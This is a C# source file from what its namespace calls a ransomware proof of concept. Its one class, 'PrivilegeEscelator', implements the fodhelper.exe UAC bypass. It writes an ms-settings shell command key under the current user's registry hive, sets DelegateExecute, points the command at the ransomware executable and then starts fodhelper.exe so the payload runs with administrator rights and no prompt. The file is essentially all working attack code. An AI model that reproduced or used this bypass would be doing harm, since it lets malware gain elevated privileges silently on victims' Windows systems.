using System;
using System.Collections.Generic;
using System.Text;
using System.Security.Principal;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace Ilay_sRanomwarePoc
{
    static class PrivilegeEscelator
    {
        private const string PreSignedElevatedProcess = @"C:\Windows\System32\fodhelper.exe";
        private const string RegistryName = "DelegateExecute";
        private const string RegistryDirectory = @"Software\Classes\";
        private const string RegisteryPath = @"ms-settings\shell\open\command";
        private const string TotalPath = @"Software\Classes\ms-settings\Shell\Open\command";
        private const string CommandLinePath = @"C:\Windows\System32\cmd.exe";
        private static readonly string CurrentPath = Directory.GetCurrentDirectory();
        private static readonly string FinalCommand = @"C:\Users\ilay\source\repos\Ilay'sRanomwarePoc\Ilay'sRanomwarePoc\bin\Debug\netcoreapp3.1\Ilay'sRanomwarePoc.exe";



        public static bool IsRunnigAsAdmin()
        {
            var RunningIdentity = WindowsIdentity.GetCurrent();  //do we have admin priveleges?
            var principal = new WindowsPrincipal(RunningIdentity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void UserAccountControlBypassOverFodHelperExe()//PE attack using fodhelper.exe
                                                                     //fodhelper.exe is checking the registety keys marked below:
                                                                     //fodhelper.exe is presigned with admin privileges by default and will execute the program as admin
        {
            try
            {
                RegistryKey SoftwareClasses = Registry.CurrentUser.OpenSubKey(RegistryDirectory, true);//opens up a new parrent key
                SoftwareClasses.CreateSubKey(RegisteryPath); //creating a new subkey
                RegistryKey FodHelperExe = Registry.CurrentUser.OpenSubKey(TotalPath, true);//opening the key weve created with writing premissions
                //setting values(DelegateExecute)
                FodHelperExe.SetValue(RegistryName, "");
                Console.WriteLine(FinalCommand);
                FodHelperExe.SetValue("", FinalCommand);
                FodHelperExe.Close();
                //Calling FodHelper.EXE to execute the "FinalCommand"
                CommandLineExecution.CommandExecution("start fodhelper.exe");
                Thread.Sleep(5000);
                Environment.Exit(0);//returning control to the operating system



            }
            catch
            {
                Console.WriteLine("An Error while trying to retrive admin privleges");
            }

        }




    }
}
